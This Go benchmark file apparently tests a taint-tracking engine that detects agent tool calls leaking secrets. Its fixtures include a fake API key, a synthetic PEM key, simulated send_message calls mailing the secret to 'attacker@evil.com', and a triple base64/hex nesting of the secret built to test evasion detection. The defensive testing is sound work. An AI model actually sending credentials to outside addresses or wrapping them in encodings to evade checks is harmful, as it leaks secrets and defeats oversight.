package engine

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"testing"

	"github.com/yxshwanth/Interlock/internal/model"
)

const benchSecret = "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"

// benchPEMKey is a realistic-sized (~1.7KB) PEM private key body — every
// other benchmark in this file uses benchSecret (~40 bytes), which is
// representative of token/API-key taint but not of the PEM/PuTTY key blocks
// internal/engine/taint.go registers whole (see cve_2025_53109_filesystem_
// escaperoute_pem_exfil in internal/corpus/scenarios_cve.go). CanonicalEncodings
// and CheckOverlap's strings.Contains scan are O(len(value)) per form, so a
// multi-KB tainted value is a materially different cost profile than the
// short tokens the rest of this file measures — this benchmark exists to
// check whether that difference actually shows up, not to assume it away.
func benchPEMKey() string {
	const bodyLine = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n"
	var b strings.Builder
	b.WriteString("-----BEGIN PRIVATE KEY-----\n")
	for i := 0; i < 26; i++ { // 26 * 65 bytes = 1690-byte body, within the 1.7-3.2KB real-world range
		b.WriteString(bodyLine)
	}
	b.WriteString("-----END PRIVATE KEY-----\n")
	return b.String()
}

func benchTainted(n int) []model.TaintedValue {
	out := make([]model.TaintedValue, n)
	for i := 0; i < n; i++ {
		val := fmt.Sprintf("%s-%d", benchSecret, i)
		out[i] = model.TaintedValue{
			Value:    val,
			Variants: CanonicalEncodings(val),
			Hash:     HashValue(val),
			Preview:  MaskValue(val),
		}
	}
	return out
}

func benchSinkArgs() json.RawMessage {
	return json.RawMessage(`{"to":"attacker@evil.com","body":"` + benchSecret + `"}`)
}

// benchSinkArgsMiss has no substring of any benchTaintedScale value — forces full scan.
func benchSinkArgsMiss() json.RawMessage {
	return json.RawMessage(`{"to":"ops@example.com","body":"status update: all clear, no tokens"}`)
}

// benchTaintedScale builds n distinct secrets with full CanonicalEncodings.
// The first entry uses bare benchSecret so HitPath can match early via benchSinkArgs.
func benchTaintedScale(n int) []model.TaintedValue {
	out := make([]model.TaintedValue, n)
	out[0] = model.TaintedValue{
		Value:    benchSecret,
		Variants: CanonicalEncodings(benchSecret),
		Hash:     HashValue(benchSecret),
		Preview:  MaskValue(benchSecret),
	}
	for i := 1; i < n; i++ {
		val := fmt.Sprintf("%s-%d", benchSecret, i)
		out[i] = model.TaintedValue{
			Value:    val,
			Variants: CanonicalEncodings(val),
			Hash:     HashValue(val),
			Preview:  MaskValue(val),
		}
	}
	return out
}

func BenchmarkCanonicalEncodings(b *testing.B) {
	for b.Loop() {
		_ = CanonicalEncodings(benchSecret)
	}
}

func BenchmarkCheckOverlap_1Tainted(b *testing.B) {
	tainted := benchTainted(1)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_10Tainted(b *testing.B) {
	tainted := benchTainted(10)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_50Tainted(b *testing.B) {
	tainted := benchTainted(50)
	args := benchSinkArgs()
	b.ResetTimer()
	for b.Loop() {
		CheckOverlap(tainted, args)
	}
}

func BenchmarkCheckOverlap_Scale(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgsMiss() // miss path — worst case
			b.ResetTimer()
			for b.Loop() {
				CheckOverlap(tainted, args)
			}
		})
	}
}

func BenchmarkCheckOverlap_MissPath(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgsMiss()
			b.ResetTimer()
			for b.Loop() {
				if hit := CheckOverlap(tainted, args); hit != nil {
					b.Fatal("expected miss")
				}
			}
		})
	}
}

// BenchmarkCheckOverlap_DecodeMissPath measures miss-path cost when sink leaves
// look base64-encodable (decoder runs) but do not unwrap to any registered secret.
// Sub-benchmarks publish the depth 3/4/5 latency curve (ROADMAP §15).
func BenchmarkCheckOverlap_DecodeMissPath(b *testing.B) {
	tainted := benchTaintedScale(1000)
	noise := base64.StdEncoding.EncodeToString([]byte("status update: all clear, no tokens in this payload at all"))
	args := json.RawMessage(`{"to":"ops@example.com","body":"` + noise + `"}`)
	for _, depth := range []int{3, 4, 5} {
		depth := depth
		b.Run("depth"+strconv.Itoa(depth), func(b *testing.B) {
			SetMaxDecodeDepth(depth)
			defer SetMaxDecodeDepth(DefaultMaxDecodeDepth)
			b.ResetTimer()
			for b.Loop() {
				if hit := CheckOverlap(tainted, args); hit != nil {
					b.Fatal("expected miss")
				}
			}
		})
	}
}

// BenchmarkCheckOverlap_DecodeHitPath measures depth-3 nest detection cost.
func BenchmarkCheckOverlap_DecodeHitPath(b *testing.B) {
	secret := benchSecret
	inner := base64.StdEncoding.EncodeToString([]byte(secret))
	mid := hex.EncodeToString([]byte(inner))
	triple := base64.StdEncoding.EncodeToString([]byte(mid))
	tainted := []model.TaintedValue{{
		Value:    secret,
		Variants: CanonicalEncodings(secret),
		Hash:     HashValue(secret),
		Preview:  MaskValue(secret),
	}}
	args := json.RawMessage(`{"body":"` + triple + `"}`)
	b.ResetTimer()
	for b.Loop() {
		if hit := CheckOverlap(tainted, args); hit == nil {
			b.Fatal("expected hit")
		}
	}
}

func BenchmarkCheckOverlap_HitPath(b *testing.B) {
	for _, n := range []int{100, 1000, 10000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			tainted := benchTaintedScale(n)
			args := benchSinkArgs() // matches tainted[0] early
			b.ResetTimer()
			for b.Loop() {
				if hit := CheckOverlap(tainted, args); hit == nil {
					b.Fatal("expected hit")
				}
			}
		})
	}
}

func BenchmarkEvaluateRequest_Exfil_Scale(b *testing.B) {
	for _, n := range []int{100, 1000} {
		b.Run(fmt.Sprintf("%d", n), func(b *testing.B) {
			eng, _ := newTestEngine("block")
			sid := fmt.Sprintf("bench-exfil-scale-%d", n)
			state := eng.store.GetOrCreate(sid)
			state.Tainted = benchTaintedScale(n)
			sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
				`{"to":"attacker@evil.com","body":"`+benchSecret+`"}`)
			b.ResetTimer()
			for b.Loop() {
				eng.EvaluateRequest(sinkCall)
			}
		})
	}
}

func BenchmarkEngine_IngestResult_TaintExtract(b *testing.B) {
	eng, _ := newTestEngine("block")
	ev := makeResultEvent("bench", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+benchSecret+`"}]}`)
	// Warm legs once so iterations measure registration, not first-lit bookkeeping.
	eng.IngestResult(ev)
	b.ResetTimer()
	for b.Loop() {
		state := eng.store.Get("bench")
		state.Tainted = nil
		eng.IngestResult(ev)
	}
}

// BenchmarkCanonicalEncodings_PEMSized measures registration cost for a
// single ~1.7KB value against BenchmarkCanonicalEncodings' ~40-byte
// benchSecret — nine forms over a multi-KB value (hex alone doubles it,
// gzip allocates its own window) is not the same cost as nine forms over a
// short token.
func BenchmarkCanonicalEncodings_PEMSized(b *testing.B) {
	key := benchPEMKey()
	b.ResetTimer()
	for b.Loop() {
		_ = CanonicalEncodings(key)
	}
}

// BenchmarkEngine_IngestResult_TaintExtract_PEMSized mirrors
// BenchmarkEngine_IngestResult_TaintExtract but with a realistic-sized PEM
// key as the sole tainted value, to check whether docs/performance.md's
// "~0.5 ms on sensitive reads" headline (measured on a 2-secret, ~40-byte-
// each fixture) still holds for a session that reads a keyfile instead of a
// token.
func BenchmarkEngine_IngestResult_TaintExtract_PEMSized(b *testing.B) {
	eng, _ := newTestEngine("block")
	// Same tool/server (read_ticket/tickets, tagged sensitive_source) as
	// BenchmarkEngine_IngestResult_TaintExtract so both benchmarks hit
	// identical leg-lighting/logging paths — isolating the delta to
	// CanonicalEncodings/extraction cost on a bigger value, not incidental
	// log-volume differences from a different tool tag.
	ev := makeResultEvent("bench-pem", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":`+mustJSONString(benchPEMKey())+`}]}`)
	eng.IngestResult(ev)
	b.ResetTimer()
	for b.Loop() {
		state := eng.store.Get("bench-pem")
		state.Tainted = nil
		eng.IngestResult(ev)
	}
}

func BenchmarkEngine_EvaluateRequest_Exfil(b *testing.B) {
	eng, _ := newTestEngine("block")
	sid := "bench-exfil"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: `+benchSecret+`"}]}`))
	sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker@evil.com","body":"`+benchSecret+`"}`)
	b.ResetTimer()
	for b.Loop() {
		eng.EvaluateRequest(sinkCall)
	}
}
